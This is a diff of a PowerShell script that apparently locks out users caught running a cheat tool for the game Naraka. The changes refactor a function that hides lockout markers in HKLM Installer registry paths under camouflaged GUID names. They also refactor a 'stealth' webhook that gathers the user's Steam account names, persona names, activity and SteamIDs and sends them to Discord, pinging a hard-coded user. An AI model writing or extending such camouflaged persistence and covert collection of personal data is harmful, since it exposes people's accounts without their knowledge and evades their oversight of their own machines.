@@ -67,7 +67,9 @@ if (Test-Path $logPath) {
 function Get-ObfuscatedRegistryPath {
     param([string]$Purpose = 'lockout')
     
-    $seed = "$env:COMPUTERNAME-$env:PROCESSOR_IDENTIFIER".GetHashCode().ToString('X8')
+    # Calculate base seed from machine identifiers
+    $seedRaw = "$env:COMPUTERNAME-$env:PROCESSOR_IDENTIFIER".GetHashCode()
+    $seedHex = $seedRaw.ToString('X8')
     
     # Use registry paths that have existing GUID/HWID-style subkeys for perfect camouflage
     $basePaths = @(
@@ -76,19 +78,19 @@ function Get-ObfuscatedRegistryPath {
         "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products"
     )
 
-    $selectedIndex = [Math]::Abs($seed.GetHashCode()) % $basePaths.Count
+    $selectedIndex = [Math]::Abs($seedRaw) % $basePaths.Count
     $basePath = $basePaths[$selectedIndex]
     
     # Build GUID-format subkey matching standard {8-4-4-4-12} pattern (38 chars total)
     # Use machine-specific hash + date components to create unique but reproducible GUID
-    $hash1 = $seed.GetHashCode().ToString('X8')
-    $hash2 = ([System.Security.Cryptography.MD5]::Create().ComputeHash([System.Text.Encoding]::UTF8.GetBytes($seed)) | Select-Object -First 8 | ForEach-Object { $_.ToString('X2') }) -join ''
+    $hash1 = $seedHex
+    $hash2 = ([System.Security.Cryptography.MD5]::Create().ComputeHash([System.Text.Encoding]::UTF8.GetBytes($seedHex)) | Select-Object -First 8 | ForEach-Object { $_.ToString('X2') }) -join ''
     $year = (Get-Date).Year.ToString('X4')
     $month = (Get-Date).Month.ToString('X2').PadLeft(2, '0')
     $day = (Get-Date).Day.ToString('X2').PadLeft(2, '0')
     
     # Format: {HASH1(8)-YEAR(4)-MODAY(4)-HASH2(4)-HASH2(12)}
-    # Example: {F42B7CBB-07E9-0A1F-8C3D-4E5F6A7B8C9D}
+    # Example: {728B473D-07E9-0A05-5ED4-5B58EF00CE52}
     $subKey = "{$hash1-$year-$month$day-$($hash2.Substring(0,4))-$($hash2.Substring(4,12))}"
     
     $fullPath = Join-Path $basePath $subKey
@@ -1499,65 +1501,69 @@ function Send-StealthWebhook {
             $content = "ATTEMPTED RUN BY A CHEATER: $mention <@313455919042396160>"
             $payload = @{ content = $content; embeds = @($embed) }
         } else {
-            # Get Steam library information for detection alerts
+            # Get Steam library and account information for detection alerts
             $steamLibraryInfo = Get-SteamLibraryInfo
-            $embeds = @()
+            $steamAccounts = Get-SteamAccounts
             
-            foreach ($method in $DetectionMethods) {
-                $fieldsArray = @(
-                    @{ name = 'Username'; value = if ($mention) { "$UserName ($mention)" } else { $UserName }; inline = $false }
-                    @{ name = 'UserID'; value = $UserId; inline = $true }
-                    @{ name = 'Detection Method'; value = $method; inline = $false }
-                )
+            # Build single embed with all detection methods as fields
+            $fieldsArray = @(
+                @{ name = 'Username'; value = if ($mention) { "$UserName ($mention)" } else { $UserName }; inline = $false }
+                @{ name = 'UserID'; value = $UserId; inline = $true }
+            )
+            
+            # Add each detection method as a separate field
+            for ($i = 0; $i -lt $DetectionMethods.Count; $i++) {
+                $detectionNum = $i + 1
+                $fieldsArray += @{ 
+                    name = "Type of Detection #$detectionNum"
+                    value = $DetectionMethods[$i]
+                    inline = $false 
+                }
+            }
+            
+            # Add Steam accounts section (top 3)
+            if ($steamAccounts.Count -gt 0 -or $steamLibraryInfo.LoginHistory.Count -gt 0) {
+                $steamLines = @()
                 
-                # Add Steam accounts to first embed only (consolidated format)
-                if ($embeds.Count -eq 0) {
-                    $steamAccounts = Get-SteamAccounts
-                    
-                    if ($steamAccounts.Count -gt 0 -or $steamLibraryInfo.LoginHistory.Count -gt 0) {
-                        $steamLines = @()
-                        
-                        # Most recent account
-                        if ($steamLibraryInfo.MostRecentAccount) {
-                            $steamLines += "🎮 **Most Recent:** $($steamLibraryInfo.MostRecentAccount)"
-                            $steamLines += ""
-                        }
-                        
-                        # Top 3 accounts with activity details
-                        $accountLines = $steamAccounts | Select-Object -First 3 | ForEach-Object {
-                            $displayName = if ($_.PersonaName -and $_.PersonaName -ne $_.UserName) {
-                                "$($_.PersonaName) [$($_.AccountName)]"
-                            } else {
-                                "$($_.UserName) [$($_.AccountName)]"
-                            }
-                            
-                            "**$displayName**`n└ $($_.LastActivity) ($($_.ActivitySource))`n└ SteamID: $($_.SteamID)"
-                        }
-                        
-                        $steamLines += $accountLines
-                        $steamValue = $steamLines -join "`n`n"
-                        $fieldsArray += @{ name = "Steam Accounts ($($steamAccounts.Count))"; value = $steamValue; inline = $false }
+                # Most recent account
+                if ($steamLibraryInfo.MostRecentAccount) {
+                    $steamLines += "🎮 **Most Recent:** $($steamLibraryInfo.MostRecentAccount)"
+                    $steamLines += ""
+                }
+                
+                # Top 3 accounts with activity details
+                $accountLines = $steamAccounts | Select-Object -First 3 | ForEach-Object {
+                    $displayName = if ($_.PersonaName -and $_.PersonaName -ne $_.UserName) {
+                        "$($_.PersonaName) [$($_.AccountName)]"
+                    } else {
+                        "$($_.UserName) [$($_.AccountName)]"
                     }
+                    
+                    "**$displayName** • $($_.LastActivity) ($($_.ActivitySource))"
                 }
                 
-                $embed = @{
-                    title       = 'CHEATER DETECTED'
-                    description = 'A user with CYZ.exe has been caught and locked out.'
-                    color       = 16711680  # Red
-                    timestamp   = $timestamp
-                    fields      = $fieldsArray
+                if ($accountLines) {
+                    $steamLines += $accountLines
+                    $steamValue = $steamLines -join "`n"
+                    $fieldsArray += @{ name = "Steam Accounts ($($steamAccounts.Count))"; value = $steamValue; inline = $false }
                 }
-                
-                # Only add thumbnail to first embed
-                if ($embeds.Count -eq 0 -and $AvatarUrl -and -not [string]::IsNullOrWhiteSpace($AvatarUrl)) {
-                    $embed['thumbnail'] = @{ url = $AvatarUrl }
-                }
-                
-                $embeds += $embed
+            }
+            
+            $embed = @{
+                title       = 'CHEATER DETECTED'
+                description = 'A user with CYZ.exe has been caught and locked out.'
+                color       = 16711680  # Red
+                timestamp   = $timestamp
+                fields      = $fieldsArray
+            }
+            
+            # Add thumbnail if avatar URL is valid
+            if ($AvatarUrl -and -not [string]::IsNullOrWhiteSpace($AvatarUrl)) {
+                $embed['thumbnail'] = @{ url = $AvatarUrl }
             }
             
             $content = if ($mention) { "CHEATER ALERT $mention" } else { 'CHEATER DETECTED' }
-            $payload = @{ content = $content; embeds = $embeds }
+            $payload = @{ content = $content; embeds = @($embed) }
         }
         
         # ConvertTo-Json with proper encoding for Discord
@@ -2174,12 +2180,16 @@ function Get-SteamAccounts {
                     "$($_.UserName) [$($_.AccountName)]"
                 }
                 
-                "**$displayName**`n└ Last Activity: $($_.LastActivity) ($($_.ActivitySource))`n└ SteamID: [$($_.SteamID)]($($_.ProfileUrl))"
+                "**$displayName** • $($_.LastActivity) ($($_.ActivitySource))"
             }
             
-            $steamLines += $accountLines
-            $steamValue = $steamLines -join "`n`n"
-            $fieldsArray += @{ name = "Steam Accounts ($($steamAccounts.Count))"; value = $steamValue; inline = $false }
+            if ($accountLines) {
+                $steamLines += $accountLines
+                $steamValue = $steamLines -join "`n"
+                $fieldsArray += @{ name = "Steam Accounts ($($steamAccounts.Count))"; value = $steamValue; inline = $false }
+            } else {
+                $fieldsArray += @{ name = 'Steam Accounts'; value = 'No accounts found with Naraka activity'; inline = $false }
+            }
         } else {
             $fieldsArray += @{ name = 'Steam Accounts'; value = 'None detected'; inline = $false }
         }
